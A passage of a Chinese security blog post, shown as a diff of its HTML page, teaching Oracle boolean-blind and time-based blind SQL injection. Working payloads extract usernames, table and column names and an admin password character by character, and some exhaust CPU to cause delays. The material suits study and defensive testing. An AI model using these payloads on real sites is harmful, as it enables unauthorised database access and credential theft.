+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 判断用户名第一个字符是否为 &#x27;S&#x27;（ASCII 83）</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; AND ASCII(SUBSTR((SELECT USER FROM DUAL), 1, 1)) = 83 --</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-- 或者用更直观的字符串比较</span></span><br><span class="line"><span class="string">?id=1&#x27;</span> <span class="keyword">AND</span> SUBSTR((<span class="keyword">SELECT</span> <span class="keyword">USER</span> <span class="keyword">FROM</span> DUAL), <span class="number">1</span>, <span class="number">1</span>) <span class="operator">=</span> <span class="string">&#x27;S&#x27;</span> <span class="comment">--</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>判断逻辑</strong>：</p>
+<ul>
+<li><code>= 83</code> 正确 → 页面正常 → 第一个字符是 ‘S’</li>
+<li>不正确 → 页面异常 → 尝试其他 ASCII 值</li>
+</ul>
+<p><strong>判断当前用户下的表数量</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 表数量是否 = 5？</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; AND (SELECT COUNT(*) FROM USER_TABLES) = 5 --</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>获取第一张表名的长度</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 第一张表名的长度是否 = 6？</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; AND (SELECT LENGTH(table_name) FROM USER_TABLES WHERE ROWNUM = 1) = 6 --</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>逐字符获取表名</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 第一张表名的第一个字符是否为 &#x27;U&#x27;？</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; AND ASCII(SUBSTR((SELECT table_name FROM USER_TABLES WHERE ROWNUM = 1), 1, 1)) = 85 --</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-- 第一个字符是否为 &#x27;</span>A<span class="string">&#x27;？</span></span><br><span class="line"><span class="string">?id=1&#x27;</span> <span class="keyword">AND</span> ASCII(SUBSTR((<span class="keyword">SELECT</span> table_name <span class="keyword">FROM</span> USER_TABLES <span class="keyword">WHERE</span> ROWNUM <span class="operator">=</span> <span class="number">1</span>), <span class="number">1</span>, <span class="number">1</span>)) <span class="operator">=</span> <span class="number">65</span> <span class="comment">--</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 依次类推，逐个字符爆破</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>获取 <code>USERS</code> 表的列数</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- USERS 表是否有 4 列？</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; AND (SELECT COUNT(*) FROM USER_TAB_COLUMNS WHERE table_name = &#x27;</span>USERS<span class="string">&#x27;) = 4 --</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>获取 <code>USERS</code> 表的列名</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 第一列的第一个字符是否为 &#x27;I&#x27;？</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; AND ASCII(SUBSTR((SELECT column_name FROM USER_TAB_COLUMNS WHERE table_name = &#x27;</span>USERS<span class="string">&#x27; AND ROWNUM = 1), 1, 1)) = 73 --</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>获取数据</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- admin 用户的密码第一个字符 ASCII 是否为 97（&#x27;a&#x27;）？</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; AND ASCII(SUBSTR((SELECT password FROM USERS WHERE username = &#x27;</span>admin<span class="string">&#x27;), 1, 1)) = 97 --</span></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h2 id="时间盲注-2"><a href="#时间盲注-2" class="headerlink" title="时间盲注"></a>时间盲注</h2><p><strong>可利用函数</strong></p>
+<table>
+<thead>
+<tr>
+<th align="left">函数</th>
+<th align="left">作用</th>
+<th align="left">示例</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left"><code>DBMS_LOCK.SLEEP(秒数)</code></td>
+<td align="left">让会话休眠指定秒数</td>
+<td align="left"><code>DBMS_LOCK.SLEEP(5)</code> → 延时 5 秒</td>
+</tr>
+<tr>
+<td align="left"><code>CASE WHEN ... THEN ... ELSE ... END</code></td>
+<td align="left">条件判断，结合延时</td>
+<td align="left"><code>CASE WHEN 条件 THEN DBMS_LOCK.SLEEP(5) ELSE 1 END</code></td>
+</tr>
+<tr>
+<td align="left"><code>DECODE()</code></td>
+<td align="left">条件判断函数</td>
+<td align="left"><code>DECODE(条件, 真值, 延时函数, 假值)</code></td>
+</tr>
+</tbody></table>
+<p>注：<strong><code>DBMS_LOCK.SLEEP()</code> 需要执行权限</strong>。如果当前用户无权限，可以尝试：</p>
+<ul>
+<li><code>SYS.DBMS_LOCK.SLEEP()</code>（指定 SYS 模式）</li>
+<li>或者用 <code>AND (SELECT COUNT(*) FROM ALL_OBJECTS) &gt; 1000000</code> 这种消耗 CPU 的方式模拟延时</li>
+</ul>
+<p><strong>示例：</strong></p>
+<h4 id="基础测试（是否存在时间盲注）"><a href="#基础测试（是否存在时间盲注）" class="headerlink" title="基础测试（是否存在时间盲注）"></a>基础测试（是否存在时间盲注）</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; AND DBMS_LOCK.SLEEP(5) -- </span></span><br></pre></td></tr></table></figure>
+
+<p>如果页面响应延迟了 5 秒，说明存在时间盲注。</p>
+<p><strong>结合条件判断</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 如果当前用户是 &#x27;SYS&#x27;，就延时 5 秒</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; AND (SELECT CASE WHEN USER = &#x27;</span>SYS<span class="string">&#x27; THEN DBMS_LOCK.SLEEP(5) ELSE 1 END FROM DUAL) IS NOT NULL --</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>判断用户名第一个字符</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 如果第一个字符 ASCII = 83（&#x27;S&#x27;），延时 5 秒</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; AND (SELECT CASE WHEN ASCII(SUBSTR((SELECT USER FROM DUAL), 1, 1)) = 83 THEN DBMS_LOCK.SLEEP(5) ELSE 1 END FROM DUAL) IS NOT NULL --</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>判断逻辑</strong>：</p>
+<ul>
+<li>页面响应延迟 5 秒 → 条件为真 → 第一个字符是 ‘S’</li>
+<li>立即响应 → 条件为假 → 尝试其他 ASCII 值</li>
+</ul>
+<p><strong>逐字符获取表名</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 第一张表名的第一个字符是否为 &#x27;U&#x27;？</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; AND (SELECT CASE WHEN ASCII(SUBSTR((SELECT table_name FROM USER_TABLES WHERE ROWNUM = 1), 1, 1)) = 85 THEN DBMS_LOCK.SLEEP(5) ELSE 1 END FROM DUAL) IS NOT NULL --</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>获取数据</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- admin 的密码第一个字符是否为 &#x27;a&#x27;？</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; AND (SELECT CASE WHEN ASCII(SUBSTR((SELECT password FROM USERS WHERE username = &#x27;</span>admin<span class="string">&#x27;), 1, 1)) = 97 THEN DBMS_LOCK.SLEEP(5) ELSE 1 END FROM DUAL) IS NOT NULL --</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>无 <code>DBMS_LOCK.SLEEP</code> 权限的替代方案</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 方法1：大量计算导致延时</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; AND (SELECT COUNT(*) FROM ALL_OBJECTS A, ALL_OBJECTS B, ALL_OBJECTS C) &gt; 0 --</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-- 方法2：使用递归 CTE（高版本 Oracle）</span></span><br><span class="line"><span class="string">?id=1&#x27;</span> <span class="keyword">AND</span> (<span class="keyword">WITH</span> T(N) <span class="keyword">AS</span> (<span class="keyword">SELECT</span> <span class="number">1</span> <span class="keyword">FROM</span> DUAL <span class="keyword">UNION</span> <span class="keyword">ALL</span> <span class="keyword">SELECT</span> N<span class="operator">+</span><span class="number">1</span> <span class="keyword">FROM</span> T <span class="keyword">WHERE</span> N<span class="operator">&lt;</span><span class="number">1000000</span>) <span class="keyword">SELECT</span> <span class="built_in">COUNT</span>(<span class="operator">*</span>) <span class="keyword">FROM</span> T) <span class="operator">&gt;</span> <span class="number">0</span> <span class="comment">--</span></span><br></pre></td></tr></table></figure>
+
+    </article>
+    
+    <div class="read-nums">
+      <!-- id 将作为查询条件 -->
+      <span id="2026/07/17/其他类型的数据库的注入/" class="leancloud_visitors" data-flag-title="Your Article Title">
+        <em class="post-meta-item-text">浏览量</em>
+        <i class="leancloud-visitors-count"></i>
+      </span>
+    </div>
+    <div class="comments-intro">
+      <h2>评论区</h2>
+      <p>欢迎你留下宝贵的意见，昵称输入QQ号会显示QQ头像哦~</p>
+    </div>
+    <div id="vcomments" class="vcomments"></div>
+    
+  </div>
+  <div class="article-catelogue">
+    <div class="article-catelogue--wrapper">
+      <div class="catelogue catelogue-1">
+        <h3>目录</h3>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%85%B6%E4%BB%96%E7%B1%BB%E5%9E%8B%E7%9A%84%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E6%B3%A8%E5%85%A5"><span class="toc-number">1.</span> <span class="toc-text">其他类型的数据库的注入</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#MS-SQL-Server%E6%B3%A8%E5%85%A5"><span class="toc-number">2.</span> <span class="toc-text">MS SQL Server注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#MS-SQL-Server-%E6%95%B0%E6%8D%AE%E5%BA%93%E4%BB%8B%E7%BB%8D"><span class="toc-number">2.1.</span> <span class="toc-text">MS SQL Server 数据库介绍</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E7%9A%84%E5%87%BD%E6%95%B0"><span class="toc-number">2.2.</span> <span class="toc-text">常用的函数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%85%E7%BD%AE%E7%B3%BB%E7%BB%9F%E8%A1%A8"><span class="toc-number">2.3.</span> <span class="toc-text">内置系统表</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL-Server%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">2.4.</span> <span class="toc-text">SQL Server信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">2.5.</span> <span class="toc-text">报错注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5"><span class="toc-number">2.6.</span> <span class="toc-text">联合注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8"><span class="toc-number">2.7.</span> <span class="toc-text">布尔盲注</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8"><span class="toc-number">2.8.</span> <span class="toc-text">时间盲注</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#PostgreSQL%E6%B3%A8%E5%85%A5"><span class="toc-number">3.</span> <span class="toc-text">PostgreSQL注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#PostgreSQL%E6%95%B0%E6%8D%AE%E5%BA%93%E4%BB%8B%E7%BB%8D"><span class="toc-number">3.1.</span> <span class="toc-text">PostgreSQL数据库介绍</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PostgreSQL%E5%AF%B9%E6%AF%94mysql%E8%AF%AD%E6%B3%95"><span class="toc-number">3.2.</span> <span class="toc-text">PostgreSQL对比mysql语法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PostgreSQL%E6%B3%A8%E5%85%A5%E7%9A%84%E5%85%B3%E9%94%AE%E7%B3%BB%E7%BB%9F%E8%A1%A8%E5%8F%8A%E5%AD%97%E6%AE%B5"><span class="toc-number">3.3.</span> <span class="toc-text">PostgreSQL注入的关键系统表及字段</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PostgreSQL%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4"><span class="toc-number">3.4.</span> <span class="toc-text">PostgreSQL常用命令</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2"><span class="toc-number">3.5.</span> <span class="toc-text">联合查询</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5-1"><span class="toc-number">3.6.</span> <span class="toc-text">报错注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%B1%BB%E5%9E%8B%E8%BD%AC%E6%8D%A2%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">3.6.1.</span> <span class="toc-text">类型转换报错注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#XML-JSON%E5%87%BD%E6%95%B0%E6%8A%A5%E9%94%99"><span class="toc-number">3.6.2.</span> <span class="toc-text">XML&#x2F;JSON函数报错</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%95%B0%E7%BB%84%E8%BD%AC%E6%8D%A2%E9%94%99%E8%AF%AF"><span class="toc-number">3.6.3.</span> <span class="toc-text">数组转换错误</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8-1"><span class="toc-number">3.7.</span> <span class="toc-text">布尔盲注</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8-1"><span class="toc-number">3.8.</span> <span class="toc-text">时间盲注</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Oracle-Database"><span class="toc-number">4.</span> <span class="toc-text">Oracle Database</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AE%80%E4%BB%8B%EF%BC%9A"><span class="toc-number">4.1.</span> <span class="toc-text">简介：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E5%BA%93%E4%BF%A1%E6%81%AF%E8%A1%A8"><span class="toc-number">4.2.</span> <span class="toc-text">数据库信息表</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5%E5%85%B3%E9%94%AE%E8%A1%A8"><span class="toc-number">4.3.</span> <span class="toc-text">注入关键表</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5-1"><span class="toc-number">4.4.</span> <span class="toc-text">联合注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5-2"><span class="toc-number">4.5.</span> <span class="toc-text">报错注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#CTXSYS-DRITHSX-SN-%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">4.5.1.</span> <span class="toc-text">CTXSYS.DRITHSX.SN()报错注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#XMLType-%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">4.5.2.</span> <span class="toc-text">XMLType 报错注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%99%A4%E9%9B%B6%E9%94%99%E8%AF%AF%E6%B3%A8%E5%85%A5"><span class="toc-number">4.5.3.</span> <span class="toc-text">除零错误注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#UTL-INADDR-%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">4.5.4.</span> <span class="toc-text">UTL_INADDR 报错注入</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8-2"><span class="toc-number">4.6.</span> <span class="toc-text">布尔盲注</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8-2"><span class="toc-number">4.7.</span> <span class="toc-text">时间盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80%E6%B5%8B%E8%AF%95%EF%BC%88%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8%EF%BC%89"><span class="toc-number">4.7.1.</span> <span class="toc-text">基础测试（是否存在时间盲注）</span></a></li></ol></li></ol></li></ol>
+      </div>
+      
+        <div class="catelogue catelogue-2">
+          
+            <p>
+              <span>上一篇：</span>
+              <a href="/2026/07/17/SQL注入相关/">SQL注入相关</a>
+            </p>
+           
+          
+            <p>
+              <span>下一篇</span>
+              <a href="/2026/07/17/XXE漏洞/">XXE漏洞</a>
+            </p>
+          
+        </div>
+      
+    </div>
+  </div>
+</div>
+
+
+<script>
+  // var定义，避免pjax重新进来造成的重复声明错误
+  var config = JSON.parse('{"enable":true,"appId":"Pf8zCXGEH1qsprnWfikVVujL-gzGzoHsz","appKey":"qOqoiUHhH1TGtLRUYURkLRQX","placeholder":"请留下你宝贵的意见吧~","meta":["nick"],"recordIP":true,"visitor":true,"enableQQ":true}')
+  new Valine({
+    el: '#vcomments',
+    appId: config.appId,
+    appKey: config.appKey,
+    placeholder: config.placeholder,
+    meta: config.meta,
+    recordIP: config.recordIP,
+    visitor: config.visitor,
+    enableQQ: config.enableQQ,
+    path: '2026/07/17/其他类型的数据库的注入/'
+  })
+</script>
+
+
+<script>
+  $(document).on('pjax:complete', function() {
+    const tocs = document.querySelector('.toc')
+    const links = tocs ? tocs.querySelectorAll('a') : []
+    links.forEach(link => {
+      link.addEventListener('click', e => {
+        const href = decodeURIComponent(e.href)
+        href.search(/#(.*)/)
+        const id = RegExp.$1
+        const target = document.querySelector('#' + id)
+        const top = target.offsetTop
+        document.documentElement.scrollTo({
+          top: top - 100,
+          behavior: 'smooth'
+        })
+        e.preventDefault()
+      })
+    })
+  })
+</script> 
+
+</div>
+      <div class="main-right-wrapper"><div class="main-right">
+  <div class="main-right--board">
+    <div class="main-right--title">
+      <h5>公告栏</h5>
+      <i class="iconfont icon-gonggao"></i>
+    </div>
+    <div class="main-right--content">
+      从何时开始忌讳空山无人,从何时开始怕遥望星辰 
+    </div>
+  </div>
+
+  <div id="aplayer" class="main-right--music"></div>
+
+  <div class="operate-items">
+    <div class="operate-item backtop">
+      <i class="iconfont icon-huidaodingbu"></i>
+      <span>回到顶部</span>
+    </div>
+    
+    <div class="operate-item turn-comment hidden">
+      <i class="iconfont icon-pinglun"></i>
+      <span>查看评论</span>
+    </div>
+    
+  </div>
+
+  <div class="main-right--site">
+    <div class="main-right--power">
+      <p>Power By <a target="_blank" rel="noopener" href="https://hexo.io/zh-cn/docs/">Hexo</a>.</p>
+      <p>Theme：<a target="_blank" rel="noopener" href="https://github.com/Aizener/hexo-theme-cola">Cola.</a></p>
+    </div>
+    <p class="main-right--refer"><a target="_blank" rel="noopener" href="https://beian.miit.gov.cn/#/Integrated/index">蜀ICP备2022005384号-1</a> </p>
+  </div>
+</div>
+
+<script>
+  function setOperateItem () {
+    const reg = /\d{4}\/\d{2}\/\d{2}\/.+/
+    const path = location.pathname
+    const operateDom = document.querySelector('.main-right .operate-items')
+    const commentDom = document.querySelector('.turn-comment')
+    const cateloguDom = document.querySelector('.article-catelogue > .article-catelogue--wrapper');
+
+    if (commentDom) {
+      if (reg.test(path) || path.match(/\/log\/.+/)) {
+        commentDom.classList.remove('hidden')
+        const newDom = operateDom.cloneNode(true);
+        const _backtopDom = newDom.querySelector('.backtop');
+        const _commentDom = newDom.querySelector('.turn-comment');
+        _backtopDom.addEventListener('click', () => backTopEvent());
+        _commentDom.addEventListener('click', () => commentDomEvent());
+        cateloguDom.appendChild(newDom);
+      } else {
+        commentDom.classList.add('hidden')
+      }
+    }
+  }
+
+  setOperateItem()
+  const musics = JSON.parse(`[{"name":"任我行","artist":"eason","url":"https://y.qq.com/n/ryqq_v2/player","cover":"https://y.qq.com/n/ryqq_v2/player"}]`)
+  const ap = new APlayer({
+    container: document.querySelector('#aplayer'),
+    audio: musics,
+  })
+
+  $(document).on('pjax:complete', function() {
+    setOperateItem()
+  })
+
+  document.querySelector('.backtop').addEventListener('click', () => {
+    backTopEvent();
+  })
+  const dom = document.querySelector('.turn-comment')
+  dom && dom.addEventListener('click', () => {
+    commentDomEvent();
+  })
+
+  function backTopEvent() {
+    document.documentElement.scrollTo({
+      top: 0,
+      behavior: 'smooth'
+    })
+  }
+
+  function commentDomEvent() {
+    const commentDom = document.querySelector('.comments-intro')
+    if (!commentDom) return
+    const top = commentDom.offsetTop, height = commentDom.offsetHeight
+    document.documentElement.scrollTo({
+      top: top - 2 * height,
+      behavior: 'smooth'
+    })
+  }
+</script></div>
+    </section>
+  </div>
+  <div id="progress" class="progress"></div>
+  <div id="gray" class="gray"></div>
+
+  <script>
+    function initScroll () {
+      document.addEventListener('scroll', () => {
+        const doc = document.documentElement
+        const scrollTop = doc.scrollTop
+        const pageHeight = doc.offsetHeight
+        const clientHeight = doc.clientHeight
+        const ratio = scrollTop / (pageHeight - clientHeight)
+        const progress = document.querySelector('#progress')
+        const avatarImg = document.querySelector('.main-left--avatar')
+        progress.style.width = (100 * ratio) + '%'
+        avatarImg.style.transform = `rotate(${360 * ratio}deg)`
+      })
+    }
+
+    const rootPath = "/"
+
+    const checkAndSetArticlePageLayout = () => {
+      const path = location.pathname.replace(rootPath, '');
+      if (
+        /^\/?\d{4}\/\d{2}\/\d{2}\/.*/.test(path) ||
+        /^log\/.+/.test(path)
+      ) {
+        $('.main-container, .main-right, .main-right-wrapper').addClass('is-article')
+      } else {
+        $('.main-container, .main-right, .main-right-wrapper').removeClass('is-article')
+      }
+    }
+
+    const gray = "none"
+    const setGrayStyle = () => {
+      if (gray === 'none') {
+        return
+      } else if (gray === 'index') {
+        location.pathname === '/' ? $('#gray').show() : $('#gray').hide()
+      } else if (gray === 'all') {
+        $('#gray').show()
+      }
+    }
+    setGrayStyle()
+
+
+    window.onload = function () {
+      checkAndSetArticlePageLayout()
+      setTimeout(() => {
+        $('#load').slideUp()
+        $('#container').slideToggle()
+        setTimeout(() => {
+          initScroll();
+        }, 500)
+      }, 500)
+    }
+    
+    let status = 0
+    // 对所有链接跳转事件绑定pjax容器container
+    $(document).pjax('a[target!=_blank]', '#main-container', {
+      container: '#main-container',
+      fragment: '#main-container',
+      timeout: 8000
+    })
+
+    $(document).on('pjax:start', function() {
+    })
+    $(document).on('pjax:complete', function() {
+      status = 0
+      $('.main-container').addClass('to-up').on('animationend', function() {
+        $(this).removeClass('to-up')
+      })
+      setGrayStyle()
+      checkAndSetArticlePageLayout()
+    })
+    $(document).on('pjax:popstate', function() {
+      status = -1
+      checkAndSetArticlePageLayout()
+    });
+  </script>
+</body>
+</html>
